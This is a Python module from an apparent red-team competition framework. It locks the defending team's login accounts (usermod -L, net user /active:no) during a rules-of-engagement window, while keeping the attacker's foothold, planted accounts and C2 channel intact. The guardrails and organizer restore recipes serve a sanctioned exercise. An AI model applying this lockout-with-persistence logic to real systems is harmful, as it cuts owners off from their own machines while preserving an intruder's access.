"""lockout — take blue's own logins away, in the ROE's lockout window only.

Service takedowns are pressure; this is possession. In the last minutes of the
event red stops being subtle: every blue login account — the credlist accounts
the engine authenticates with, and the box account engineers actually work from —
is password-locked, so blue cannot log in to fix what is still standing.

Ported from v1's burndown + `firewall_lockout` (mode=lockout):

* Linux  ``usermod -L <user>`` per account  (undo: ``usermod -U <user>``)
* Windows ``net user <user> /active:no``    (undo: ``net user <user> /active:yes``)

Four things are deliberately NOT v1's shape:

* **the window is the only key.** A locked account's undo is organizer-facing, so
  `check()` refuses this effect unless `policy.window_open("lockout")` — outside
  that window a lockout is indistinguishable from vandalism, and the ROE does not
  pay for it;
* **red's own way in is never locked.** The foothold user, root, and every
  planted `svc-*` account are out. On Windows the SSH path *is* Administrator, so
  a lock list that would disable our own session is refused unless a live C2
  channel covers the box — the channel built to outlive exactly that (v1's
  `_live_beacon` rule);
* **the lock is verified, not assumed.** The shadow hash of every account is read
  back (a leading ``!``/``*``) and Windows' `Enabled` flag is read back, so
  `ok=True` means the accounts are actually locked. Accounts that cannot be
  verified are reported instead of claimed;
* **the record survives the claim.** Locked accounts are recorded (impact row,
  artifact, restore recipe) whenever the mutation landed — even when only some
  accounts verified — because a partial lockout blue can see is still information
  for the organizer's after-action.
"""

import re
import shlex

from ..errors import PolicyError
from . import artifactnames as names_mod
from .base import Effect, Result, can_root, register
from .block_port import run_root_script
from .takedown import windows_admin

# "<status> <user>" per account, from either OS's read-back.
STATUS_RE = re.compile(r"^([LUN])\s+(\S+)\s*$", re.M)
LOCKED, UNLOCKED, MISSING = "L", "U", "N"

_USER_RE = re.compile(r"^[A-Za-z0-9._-]+$")

# `root` is the one account a lockout never touches: it is the box's own way out
# of a broken state and red's last resort.
NEVER = ("root",)


def off_limits(user, fh, windows=False):
    """True for an account the lockout must not touch.

    Red's own plants are always out. On Linux our foothold user is out too — red
    keeps working through it. On Windows the box account IS the SSH path red uses,
    so it is NOT excluded here: the channel rule in `_plan` decides, because
    leaving Administrator enabled on a Windows box means blue was never locked out
    at all (v1's `keep_foothold_user` case).
    """
    user = (user or "").strip()
    if not user:
        return True
    if user.lower() in NEVER:
        return True
    if names_mod.is_planted_account(user):
        return True
    if not windows and user.lower() == str((fh or {}).get("user", "")).lower():
        return True
    return False


def parse_status(out):
    """{user: 'L'|'U'|'N'} from the read-back (the regex is (state, user))."""
    return {user: state for state, user in STATUS_RE.findall(out or "")}


@register
class Lockout(Effect):
    id = "lockout"
    name = "lock blue's own logins out"
    description = (
        "Password-lock blue's login accounts on a box (Linux usermod -L, Windows "
        "net user /active:no) so they cannot log in to fix anything still standing. "
        "Endgame only: the ROE's lockout window is the gate, and a locked account's "
        "undo is organizer-facing, so this is refused outside that window. Never "
        "touches red's own access (the foothold user, root, planted accounts), and "
        "on Windows refuses to disable the account our SSH path uses unless a live "
        "C2 channel covers the box. Every lock is read back off the box before it "
        "is claimed.")
    params = {
        "ip": {"type": "str", "required": True, "desc": "target box"},
        "users": {"type": "list",
                  "desc": "specific accounts to lock (default: the box's blue login "
                          "accounts — intel's credlist plus the box account)"},
    }
    tags = frozenset({"endgame", "unrecoverable"})
    needs = {"foothold": True, "root": False, "c2": False, "os": "any"}

    # -- preconditions ---------------------------------------------------------

    def check(self, ctx, params):
        super().check(ctx, params)
        ip = params["ip"]
        fh = ctx.world.foothold(ip)
        windows = bool(fh.get("windows"))
        if windows:
            if not windows_admin(fh):
                raise PolicyError(f"lockout needs an Administrator foothold on {ip}")
        elif not can_root(fh):
            raise PolicyError(f"lockout needs a root path on {ip} — escalate first")

        policy = getattr(ctx, "policy", None)
        if policy is None:
            raise PolicyError("lockout needs the ROE clock (ctx.policy) — the "
                              "lockout window is the only thing that unlocks it")
        if not policy.window_open("lockout"):
            raise PolicyError("lockout window is not open (red.windows.lockout) — "
                              "a locked account is an organizer restore, so this "
                              "stays shut outside its window")
        if not policy.unrecoverable_unlocked():
            raise PolicyError("lockout is an unrecoverable move — locked until the "
                              "second half or the tier that unlocks it")

        users, why = self._plan(ctx, ip, params)
        if not users:
            raise PolicyError(why)
        if ctx.world.failure_count(self.id, ip) >= 2:
            raise PolicyError(f"lockout already failed twice on {ip} — inspect the "
                              "box instead of re-running")

    # -- the target list -------------------------------------------------------

    def _targets(self, ctx, ip, params, windows):
        """Blue's login accounts on this box: intel's credlist + the box account,
        minus red's own (v1's `_blue_accounts`)."""
        requested = params.get("users") or []
        if isinstance(requested, str):
            requested = [requested]
        fh = ctx.world.foothold(ip)
        out = []
        if requested:
            for user in requested:
                user = (user or "").strip()
                if not _USER_RE.match(user):
                    return [], f"lockout: {user!r} is not a user name"
                if off_limits(user, fh, windows=windows):
                    return [], (f"refusing to lock {user!r} — root or one of red's "
                                "own accounts")
                if user not in out:
                    out.append(user)
            return out, ""
        box_account = ("Administrator" if windows else ctx.intel.box_username())
        for user in list(ctx.intel.credlist_users() or []) + [box_account]:
            user = (user or "").strip()
            if not user or not _USER_RE.match(user) or user in out:
                continue
            if off_limits(user, fh, windows=windows):
                continue
            out.append(user)
        return out, ""

    def _plan(self, ctx, ip, params):
        """(accounts to lock, why-not) with the Windows channel rule applied.

        Disabling the account our own SSH path uses would cut red off, so it is
        dropped from the list — unless a live C2 channel covers the box, which is
        the whole reason that channel exists. If nothing is left to lock, the box
        is refused (v1 skipped it too).
        """
        fh = ctx.world.foothold(ip)
        windows = bool(fh and fh.get("windows"))
        users, why = self._targets(ctx, ip, params, windows)
        if why:
            return [], why
        if windows and fh["user"] in users and not self._live_channel(ctx, ip):
            users = [u for u in users if u != fh["user"]]
            if not users:
                return [], (f"the only blue login on {ip} is {fh['user']!r} — the "
                            "account our own SSH path uses, so locking it needs a "
                            "live C2 channel to keep red on the box")
        if not users:
            return [], (f"no blue login account on {ip} is safe to lock (every "
                        "candidate is root, red's own foothold, or a plant)")
        return users, ""

    @staticmethod
    def _live_channel(ctx, ip):
        """A callback fresher than `c2.callback_max_age_sec` for this box."""
        from .implant_channel import box_id_for
        key = box_id_for(ctx, ip)
        max_age = float((ctx.cfg.get("c2") or {}).get("callback_max_age_sec", 120))
        try:
            callbacks = ctx.c2.callbacks() if ctx.c2 is not None else None
        except Exception:
            callbacks = None
        record = (callbacks or {}).get(key) or (callbacks or {}).get(ip)
        if record and record.get("seen_at"):
            try:
                return (ctx.now() - float(record["seen_at"])) <= max_age
            except (TypeError, ValueError):
                pass
        # The loop also mirrors callbacks into world state.
        try:
            for candidate in (key, ip):
                age = ctx.world.callback_age(candidate)
                if age is not None and age <= max_age:
                    return True
        except Exception:
            return False
        return False

    # -- the body --------------------------------------------------------------

    def run(self, ctx, params):
        ip = params["ip"]
        fh = ctx.world.foothold(ip)
        if fh is None:
            return Result(False, f"no foothold on {ip}")
        windows = bool(fh.get("windows"))
        if windows:
            if not windows_admin(fh):
                return Result(False, f"lockout needs an Administrator foothold on {ip}")
        elif not can_root(fh):
            return Result(False, f"no root path on {ip} — privesc first")

        users, why = self._plan(ctx, ip, params)
        if not users:
            return Result(False, why)
        status, why = (self._windows(ctx, ip, fh, users) if windows
                       else self._linux(ctx, ip, fh, users))
        if status is None:
            # The lock commands may or may not have landed (the read-back is what
            # failed), so the undo recipe still goes in — an `usermod -U` /
            # `/active:yes` on an account that was never locked is a no-op.
            restore, artifact = self._records(ip, users, users, windows)
            return Result(False, why, data={"users": users}, restore=restore,
                          artifacts=[artifact], installed=True)
        return self._result(ctx, ip, users, status, windows)

    def _linux(self, ctx, ip, fh, users):
        add = "; ".join(f"usermod -L {shlex.quote(u)} 2>/dev/null" for u in users)
        # Read the shadow hash back: `usermod -L` prefixes `!`, an account with no
        # password at all is `*`/empty — both mean no password login is possible.
        read = ("for u in " + " ".join(shlex.quote(u) for u in users) + "; do "
                "h=$(grep \"^$u:\" /etc/shadow 2>/dev/null | cut -d: -f2); "
                "if [ -z \"$h\" ]; then echo \"N $u\"; "
                "else case \"$h\" in \\!*|\\**) echo \"L $u\";; *) echo \"U $u\";; "
                "esac; fi; done")
        try:
            rc, out, err = run_root_script(ctx, ip, fh, f"{add}; {read}", timeout=90)
        except Exception as exc:
            return None, f"lockout failed on {ip}: {type(exc).__name__}: {exc}"
        status = parse_status(out)
        if not status:
            return None, (f"could not read the lock state back on {ip} (rc={rc}): "
                          f"{(err or out or '').strip()[:200]}")
        return status, ""

    def _windows(self, ctx, ip, fh, users):
        add = "; ".join(f"net user {u} /active:no" for u in users)
        listing = ", ".join("'" + u + "'" for u in users)
        read = (f"foreach ($u in @({listing})) {{ "
                "$x = Get-LocalUser -Name $u -ErrorAction SilentlyContinue; "
                "if (-not $x) { 'N ' + $u } elseif ($x.Enabled) { 'U ' + $u } "
                "else { 'L ' + $u } }")
        try:
            rc, out, err = ctx.ssh.ssh_ps(ip, fh["user"], fh.get("password") or "",
                                          f"{add}; {read}", timeout=90,
                                          key_path=fh.get("key_path"))
        except Exception as exc:
            return None, f"lockout failed on {ip}: {type(exc).__name__}: {exc}"
        status = parse_status(out)
        if not status:
            return None, (f"could not read the lock state back on {ip} (rc={rc}): "
                          f"{(err or out or '').strip()[:200]}")
        return status, ""

    def _records(self, ip, attempted, locked, windows):
        """(restore, artifact) for the accounts a lockout touched."""
        undo = ([f"net user {u} /active:yes" for u in locked] if windows
                else [f"usermod -U {u}" for u in locked])
        restore = {
            "recipe": [f"# organizer-facing: {ip} was locked out in the ROE lockout "
                       "window (red.windows.lockout); this effect is tagged "
                       "unrecoverable, so blue does not get it back for free"] + undo,
            "secrets": None,
        }
        artifact = {"ip": ip, "kind": f"impact-{self.id}",
                    "detail": (f"locked {len(locked)} login account(s) on {ip}: "
                               f"{locked or 'none'} (attempted {attempted})"),
                    # No check_cmd: reading the shadow entry back needs root, and a
                    # check that fails for the wrong reason marks the artifact dead
                    # — which switches off every pressure candidate on the box.
                    "check_cmd": None, "paths": []}
        return restore, artifact

    def _result(self, ctx, ip, users, status, windows):
        locked = [u for u in users if status.get(u) == LOCKED]
        refused = [u for u in users if status.get(u) == UNLOCKED]
        absent = [u for u in users if status.get(u, MISSING) == MISSING]
        restore, artifact = self._records(ip, users, locked or [], windows)
        if refused:
            artifact["detail"] += f"; could not lock {refused}"
        if absent:
            artifact["detail"] += f"; not present on the box: {absent}"
        data = {"users": users, "locked": locked, "refused": refused,
                "absent": absent}

        if not locked:
            return Result(False, f"no account could be locked on {ip} "
                                 f"(requested {users})", data=data)
        ctx.world.note(ip, f"lockout: locked {locked} on {ip}")
        detail = (f"locked {len(locked)} login account(s) on {ip}: {locked}")
        if refused:
            # A partial lockout is a failed objective, but the mutation is real —
            # report ok=False with the box changed so the record still lands.
            return Result(False, f"only part of the lockout held on {ip}: "
                                 f"{refused} still have a usable password",
                          data=data, restore=restore, artifacts=[artifact],
                          installed=True)
        if absent:
            detail += f" ({absent} do not exist on this box)"
        caveat = self._any_password_caveat(ctx, ip)
        if caveat:
            detail += f"; {caveat}"
        return Result(True, detail, data=data,
                      impact={"ip": ip, "service": "logins", "mode": self.id,
                              "detail": detail},
                      restore=restore, artifacts=[artifact], installed=True)

    @staticmethod
    def _any_password_caveat(ctx, ip):
        """A locked password is not the whole login path on a box whose PAM stack
        accepts anything (nakon plants pam_permit). Say so instead of implying
        blue is fully locked out."""
        try:
            vulns = " ".join(ctx.intel.hints_for(ip).get("vulns") or []).lower()
        except Exception:
            return ""
        if "permit" in vulns or "empty password" in vulns:
            return ("note: this box accepts any/empty password (pam_permit plant) — "
                    "a locked password may not close blue's login path")
        return ""
